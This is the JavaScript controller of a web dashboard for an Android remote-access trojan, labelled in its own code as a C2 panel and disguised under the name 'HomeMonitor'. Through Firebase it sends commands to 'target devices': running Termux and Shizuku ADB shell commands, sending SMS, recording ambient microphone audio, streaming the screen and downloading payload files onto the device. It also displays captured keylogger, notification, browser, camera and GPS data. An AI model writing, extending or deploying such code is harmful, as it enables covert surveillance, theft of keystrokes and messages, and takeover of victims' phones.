// app.js - Main Dashboard C2 Controller & Realtime Telemetry Listeners
let activeDeviceId = "DEV_DEFAULT";

function detectClientOperatingSystem() {
    const ua = navigator.userAgent || "";
    const platform = navigator.platform || "";
    const label = document.getElementById("autoArchiveLabel");
    if (!label) return;

    if (ua.includes("Linux") || platform.includes("Linux")) {
        label.innerHTML = `<i class="fa-brands fa-linux me-1 text-primary"></i>Auto-Archive to Linux Storage`;
    } else if (ua.includes("Mac") || platform.includes("Mac")) {
        label.innerHTML = `<i class="fa-brands fa-apple me-1 text-primary"></i>Auto-Archive to Mac Storage`;
    } else if (ua.includes("Win") || platform.includes("Win")) {
        label.innerHTML = `<i class="fa-brands fa-windows me-1 text-primary"></i>Auto-Archive to Windows Storage`;
    } else if (ua.includes("Android") || ua.includes("iPhone") || ua.includes("iPad")) {
        label.innerHTML = `<i class="fa-solid fa-mobile-screen me-1 text-primary"></i>Auto-Archive to Mobile Storage`;
    } else {
        label.innerHTML = `<i class="fa-solid fa-hard-drive me-1 text-primary"></i>Auto-Archive to Local Storage`;
    }
}

// Global Event Delegation for ALL C2 Command Buttons
document.addEventListener("click", function(e) {
    const btn = e.target.closest(".exec-cmd");
    if (btn) {
        const cmd = btn.getAttribute("data-cmd");
        if (cmd) {
            console.log(`[C2 Command Clicked] Dispatching '${cmd}'`);
            sendC2CommandToDevice(cmd);
        }
    }

    const termuxBtn = e.target.closest(".termux-quick");
    if (termuxBtn) {
        const sh = termuxBtn.getAttribute("data-sh");
        if (sh) {
            sendC2CommandToDevice(`/termux ${sh}`);
            const consoleBox = document.getElementById("termuxConsoleOutput");
            if (consoleBox) {
                consoleBox.innerHTML += `\n$ ${sh}\n[Executed - Awaiting output...]`;
                consoleBox.scrollTop = consoleBox.scrollHeight;
            }
        }
    }
});

document.addEventListener("DOMContentLoaded", function() {
    detectClientOperatingSystem();
    if (typeof loadEnrolledDevicesList === "function") {
        loadEnrolledDevicesList();
    }

    document.getElementById("refreshTabBtn")?.addEventListener("click", function() {
        console.log("[Sync Now] Re-syncing active device telemetry...");
        if (activeDeviceId) {
            startRealtimeDeviceListener(activeDeviceId);
        }
        alert("🔄 Device Telemetry Sync Dispatched!");
    });

    document.getElementById("startP2pWebStreamBtn")?.addEventListener("click", function() {
        const sessId = "sess_" + Date.now();
        if (typeof initWebRtcSession === "function") {
            initWebRtcSession(sessId, true);
        }
        sendC2CommandToDevice("!webstream");
        alert("🎮 Initiated WebRTC P2P Live Screen Stream session: " + sessId);
    });

    document.getElementById("stopP2pWebStreamBtn")?.addEventListener("click", function() {
        sendC2CommandToDevice("!stopwebstream");
        if (typeof pc !== "undefined" && pc) {
            pc.close();
        }
        alert("🛑 Stopped WebRTC P2P Live Screen Stream session.");
    });
});

function loadEnrolledDevicesList() {
    const selector = document.getElementById("deviceSelector");
    if (!selector) return;

    const db = firebase.database();
    const uid = currentUser ? currentUser.uid : "default_user";

    db.ref(`users/${uid}/devices`).on("value", snapshot => {
        const discoveredDevices = snapshot.val() || {};
        selector.innerHTML = "";

        if (Object.keys(discoveredDevices).length > 0) {
            let firstId = null;
            Object.keys(discoveredDevices).forEach(devKey => {
                const devData = discoveredDevices[devKey];
                const status = devData.status || {};
                const devModel = status.model || "Android Device";
                const devName = `📱 ${devModel} (${devKey})`;

                const option = document.createElement("option");
                option.value = devKey;
                option.innerText = devName;
                selector.appendChild(option);

                if (!firstId) firstId = devKey;
            });

            if (firstId) {
                if (!activeDeviceId || !discoveredDevices[activeDeviceId]) {
                    activeDeviceId = firstId;
                }
                selector.value = activeDeviceId;
                updateActiveDeviceHeader(activeDeviceId);
                startRealtimeDeviceListener(activeDeviceId);
            }
        } else {
            const devOption = document.createElement("option");
            devOption.value = "DEV_MONITORED_DEVICE";
            devOption.innerText = "📱 HomeMonitor System (Awaiting Device Connection...)";
            selector.appendChild(devOption);

            activeDeviceId = "DEV_MONITORED_DEVICE";
            updateActiveDeviceHeader(activeDeviceId);
            startRealtimeDeviceListener(activeDeviceId);
        }
    }, error => {
        console.warn("[Firebase] Device discovery error:", error);
    });
}

document.getElementById("deviceSelector")?.addEventListener("change", function() {
    activeDeviceId = this.value;
    updateActiveDeviceHeader(activeDeviceId);
    startRealtimeDeviceListener(activeDeviceId);
});

function updateActiveDeviceHeader(deviceId) {
    const title = document.getElementById("activeDeviceTitle");
    if (title) title.innerText = `📱 Target Device: ${deviceId}`;
}

function startRealtimeDeviceListener(deviceId) {
    const db = firebase.database();
    const uid = currentUser ? currentUser.uid : "default_user";

    const statusHandler = snapshot => {
        const val = snapshot.val();
        if (val) {
            const meta = document.getElementById("activeDeviceMeta");
            if (meta) meta.innerText = `ID: ${val.deviceId || deviceId} | Model: ${val.model || 'Target Device'} | OS: Android ${val.androidVersion || '14'}`;

            const bat = document.getElementById("batteryBadge");
            if (bat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                bat.innerText = `Battery: ${val.battery ?? val.batteryLevel}%`;
            }

            const overviewName = document.getElementById("overviewDevName");
            if (overviewName) overviewName.innerText = val.model || deviceId;

            const overviewBat = document.getElementById("overviewBattery");
            if (overviewBat && (val.battery !== undefined || val.batteryLevel !== undefined)) {
                overviewBat.innerText = `${val.battery ?? val.batteryLevel}%`;
            }

            const syncTime = document.getElementById("lastSyncTime");
            if (syncTime) syncTime.innerText = new Date(val.lastSeen || Date.now()).toLocaleTimeString();

            // Populate Device Specs
            const specModel = document.getElementById("specModel");
            if (specModel) specModel.innerText = val.model || "Android System";
            const specOs = document.getElementById("specOs");
            if (specOs) specOs.innerText = `Android ${val.androidVersion || '14'} (SDK ${val.sdkInt || '35'})`;
            const specBattery = document.getElementById("specBattery");
            if (specBattery) specBattery.innerText = `${val.battery ?? val.batteryLevel ?? '85'}% (Good)`;
            const specIp = document.getElementById("specIp");
            if (specIp) specIp.innerText = val.activeAccount || "Connected (RTDB)";
        }
    };

    db.ref(`users/${uid}/devices/${deviceId}/status`).on("value", statusHandler);

    // Subscribe to live GPS telemetry
    db.ref(`users/${uid}/devices/${deviceId}/telemetry/gps_locations`).limitToLast(1).on("value", snapshot => {
        const gpsVal = snapshot.val();
        if (gpsVal) {
            const lastKey = Object.keys(gpsVal)[0];
            const item = gpsVal[lastKey];
            const textEl = document.getElementById("overviewGpsText");
            const metaEl = document.getElementById("overviewGpsMeta");
            if (textEl) textEl.innerHTML = `<i class="fa-solid fa-map-pin me-2"></i>Last Position: ${item.content || 'GPS Fix Acquired'}`;
            if (metaEl) metaEl.innerText = `Updated: ${new Date(item.timestamp || Date.now()).toLocaleTimeString()}`;
        }
    });

    // Subscribe to command responses across all output consoles
    const responseHandler = snapshot => {
        const respText = snapshot.val();
        if (respText) {
            const timestamp = new Date().toLocaleTimeString();
            const formattedMsg = `\n[${timestamp}] Target Execution Response:\n${respText}\n`;

            const consoleIds = [
                "execLogOutput",
                "termuxConsoleOutput",
                "fileExplorerOutput",
                "mdmLogOutput",
                "cameraLogOutput",
                "micLogOutput",
                "installedAppsOutput",
                "screenrecorderOutput",
                "keyloggerLogOutput",
                "notificationsLogOutput",
                "browserLogOutput"
            ];

            consoleIds.forEach(id => {
                const box = document.getElementById(id);
                if (box) {
                    box.innerHTML += formattedMsg;
                    box.scrollTop = box.scrollHeight;
                }
            });
        }
    };
    db.ref(`users/${uid}/devices/${deviceId}/response`).on("value", responseHandler);
    db.ref(`users/default_user/devices/${deviceId}/response`).on("value", responseHandler);

    loadMasterAdminPermissionMatrix(uid, deviceId);
}

function loadMasterAdminPermissionMatrix(uid, deviceId) {
    const tableBody = document.getElementById("masterAdminDeviceTable");
    if (!tableBody) return;
    tableBody.innerHTML = `
        <tr>
            <td><code>${deviceId}</code></td>
            <td>${currentUser ? currentUser.email : "admin@homemonitor.com"}</td>
            <td>Android System (SDK 35)</td>
            <td>
                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permCam"> <label class="small fw-bold">Camera</label></div>
                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permMic"> <label class="small fw-bold">Mic Audio</label></div>
                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permGps"> <label class="small fw-bold">GPS</label></div>
                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permTermux"> <label class="small fw-bold">Termux</label></div>
                <div class="form-check form-switch d-inline-block me-3"><input class="form-check-input" type="checkbox" checked id="permSms"> <label class="small fw-bold">SMS & Calls</label></div>
            </td>
            <td><button class="btn btn-sm btn-outline-warning fw-bold" onclick="saveFeaturePermissions('${uid}', '${deviceId}')">Save Flags</button></td>
        </tr>
    `;
}

function saveFeaturePermissions(uid, deviceId) {
    const flags = {
        camera_enabled: document.getElementById("permCam")?.checked ?? true,
        mic_enabled: document.getElementById("permMic")?.checked ?? true,
        location_enabled: document.getElementById("permGps")?.checked ?? true,
        termux_enabled: document.getElementById("permTermux")?.checked ?? true,
        sms_calls_enabled: document.getElementById("permSms")?.checked ?? true
    };

    firebase.database().ref(`users/${uid}/devices/${deviceId}/feature_flags`).set(flags);
    localStorage.setItem(`flags_${deviceId}`, JSON.stringify(flags));
    alert("✅ Master Admin Feature Flags Updated Successfully & Saved to LocalStorage!");
}

// Termux Interactive Terminal Form
document.getElementById("termuxForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const cmd = document.getElementById("termuxInput").value.trim();
    if (cmd) {
        sendC2CommandToDevice(`/termux ${cmd}`);
        const consoleBox = document.getElementById("termuxConsoleOutput");
        if (consoleBox) {
            consoleBox.innerHTML += `\n$ ${cmd}\n[Executed - Awaiting Termux output...]`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
        document.getElementById("termuxInput").value = "";
    }
});

// SMS Sending Form
document.getElementById("smsSendForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("smsPhoneNum").value.trim();
    const msg = document.getElementById("smsMsgText").value.trim();
    if (phone && msg) {
        sendC2CommandToDevice(`/sendsms ${phone} ${msg}`);
        alert(`✅ Outbound SMS dispatched to ${phone}`);
    }
});

// Open Browser URL Form
document.getElementById("openUrlForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("targetUrlInput").value.trim();
    if (url) {
        sendC2CommandToDevice(`/openurl ${url}`);
        alert(`🌐 Browser target URL launched: ${url}`);
    }
});

// Ambient Mic Recording Button
document.getElementById("startMicRecordBtn")?.addEventListener("click", function() {
    const sec = document.getElementById("micDurationSelect").value;
    sendC2CommandToDevice(`/audio ${sec}`);
    alert(`🎙️ Ambient Mic Recording (${sec}s) dispatched to device.`);
});

// Shizuku ADB Command Form
document.getElementById("shizukuForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const shizukuCmd = document.getElementById("shizukuCmdInput").value.trim();
    if (shizukuCmd) {
        sendC2CommandToDevice(`/shizuku ${shizukuCmd}`);
        alert(`⚡ Shizuku ADB command dispatched: ${shizukuCmd}`);
    }
});

// Geofence Form
document.getElementById("geofenceForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = this.querySelectorAll("input");
    const zoneName = inputs[0]?.value.trim() || "Safe Zone";
    const radius = inputs[1]?.value.trim() || "500";
    sendC2CommandToDevice(`/geofence add ${zoneName} ${radius}`);
    alert(`🌐 Geofence safe zone added: ${zoneName} (${radius}m)`);
});

// File Dropper Form
document.getElementById("fileDropperForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("dropperTargetUrl")?.value.trim();
    const path = document.getElementById("dropperDestination")?.value.trim();
    if (url && path) {
        sendC2CommandToDevice(`/download ${url} ${path}`);
        alert(`📥 Payload file push dispatched to ${path}`);
    }
});

// Contact Search Filter
document.getElementById("contactSearchInput")?.addEventListener("keyup", function() {
    const term = this.value.toLowerCase();
    const rows = document.querySelectorAll("#contactsTableBody tr");
    rows.forEach(r => {
        const text = r.innerText.toLowerCase();
        r.style.display = text.includes(term) ? "" : "none";
    });
});

function sendC2CommandToDevice(cmdText) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const db = firebase.database();

    const cmdPayload = {
        text: cmdText,
        status: "pending",
        timestamp: Date.now()
    };

    // Push command payload to authorized device target path
    db.ref(`users/${uid}/devices/${activeDeviceId}/commands`).push().set(cmdPayload);

    // Cache sent command locally in localStorage
    const history = JSON.parse(localStorage.getItem(`cmd_history_${activeDeviceId}`) || "[]");
    history.push({ cmd: cmdText, time: new Date().toLocaleTimeString() });
    localStorage.setItem(`cmd_history_${activeDeviceId}`, JSON.stringify(history.slice(-50)));

    const outputBox = document.getElementById("execLogOutput");
    if (outputBox) {
        outputBox.innerHTML += `\n[${new Date().toLocaleTimeString()}] Dispatched Command: '${cmdText}' (Pending target execution...)`;
        outputBox.scrollTop = outputBox.scrollHeight;
    }
}

function triggerLocalDiskAutoArchive(filename, contentText) {
    const isAutoArchiveEnabled = document.getElementById("autoArchiveLocalToggle")?.checked ?? true;
    if (!isAutoArchiveEnabled || !contentText) return;

    try {
        const blob = new Blob([contentText], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `C2_Archive_${filename}_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        console.log(`[Local Disk Auto-Archive] Successfully archived ${filename} to local storage.`);
    } catch (e) {
        console.warn(`[Local Disk Auto-Archive] Local archive error: ${e.message}`);
    }
}

function fetchCategoryTelemetryLogs(tabCategory) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const genericOutput = document.getElementById("genericLogOutput");
    if (!genericOutput) return;

    genericOutput.innerText = `[System] Subscribed to Realtime Stream for Category '${tabCategory}'...\n`;

    firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/telemetry/${tabCategory}`).limitToLast(20).on("value", snapshot => {
        const val = snapshot.val();
        if (val) {
            let logText = "";
            Object.keys(val).forEach(key => {
                const item = val[key];
                logText += `[${new Date(item.timestamp).toLocaleTimeString()}] ${item.content}\n`;
            });
            genericOutput.innerText = logText;
            genericOutput.scrollTop = genericOutput.scrollHeight;
            localStorage.setItem(`telemetry_cache_${tabCategory}`, logText);
            triggerLocalDiskAutoArchive(tabCategory, logText);
        } else {
            const cached = localStorage.getItem(`telemetry_cache_${tabCategory}`);
            if (cached) {
                genericOutput.innerText = `[LocalStorage Cache]\n` + cached;
            }
        }
    });
}
